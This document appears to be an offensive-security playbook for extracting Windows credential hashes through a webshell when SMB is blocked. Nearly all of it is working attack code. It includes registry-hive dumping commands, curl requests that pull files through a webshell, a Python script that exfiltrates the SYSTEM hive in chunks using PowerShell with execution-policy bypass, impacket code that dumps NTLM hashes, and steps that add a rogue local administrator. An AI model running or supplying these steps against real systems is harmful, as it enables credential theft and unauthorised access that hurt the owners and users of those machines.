# Windows Hash Extraction via Webshell (No SMB Required)

## When to Use
- Have SYSTEM webshell on Windows target
- SMB/WinRM blocked from attacker host (firewall, network segmentation)
- No msfvenom/mimikatz available on attacker machine
- Need SAM/SYSTEM hives for offline hash extraction

## Step 1: Save Registry Hives on Target
```
reg save HKLM\SYSTEM C:\Windows\Temp\system /y
reg save HKLM\SAM C:\Windows\Temp\sam /y
reg save HKLM\SECURITY C:\Windows\Temp\security /y
```

## Step 2: Transfer SAM (small, ~60KB)
SAM is small enough for single base64 transfer:
```bash
# On target via webshell
certutil -encode C:\Windows\Temp\sam C:\Windows\Temp\sam.b64
# Fetch via HTTP
curl -sk "http://TARGET/shell/cmd.jsp?cmd=type+C:\Windows\Temp\sam.b64" > sam.b64
# Decode locally
grep -v "CERTIFICATE" sam.b64 | base64 -d > sam.bin
```

## Step 3: Transfer SYSTEM (large, ~18MB) — Chunked Base64
SYSTEM hive is too large for single transfer. Use Python chunked download:

```python
import requests, base64

s = requests.Session()
s.verify = False
url = "http://TARGET:8080/shell/cmd.jsp"
chunk_size = 500000
total_size = 18518016  # check with: dir C:\Windows\Temp\system

all_data = b""
for i in range(0, total_size, chunk_size):
    length = min(chunk_size, total_size - i)
    ps_cmd = (f"$bytes=[IO.File]::ReadAllBytes('C:\\Windows\\Temp\\system');"
              f"[Convert]::ToBase64String($bytes,{i},{length})")
    r = s.get(url, params={"cmd": f"powershell -ep bypass -c \"{ps_cmd}\""}, timeout=120)
    all_data += base64.b64decode(r.text.strip())
    print(f"Downloaded {len(all_data)}/{total_size}")

with open("system.bin", "wb") as f:
    f.write(all_data)
```

## Step 4: Offline Hash Extraction with impacket
```python
from impacket.examples.secretsdump import LocalOperations, SAMHashes

local_ops = LocalOperations('system.bin')
boot_key = local_ops.getBootKey()
sam = SAMHashes('sam.bin', boot_key)
sam.dump()
sam.finish()
```

Output format: `Username:RID:LM_hash:NTLM_hash:::`

## Alternative: Create Temp Admin + secretsdump (if SMB reachable)
```bash
# Via webshell
net user tmpAdmin P@ss1234 /add
net localgroup Administrators tmpAdmin /add
# From attacker
secretsdump.py 'tmpAdmin:P@ss1234@TARGET'
# Cleanup
net user tmpAdmin /delete
```

## Pitfalls
- SYSTEM hive is 15-20MB typically — single base64 transfer will timeout
- 500KB chunks via PowerShell base64 is reliable sweet spot
- certutil encode adds BEGIN/END CERTIFICATE headers — strip before decode
- If SMB is filtered from attacker, secretsdump remote will timeout
- Always clean up: delete temp admin, delete hive copies from Temp
- SAM contains LOCAL accounts only; for domain accounts use NTDS.dit + secretsdump -just-dc
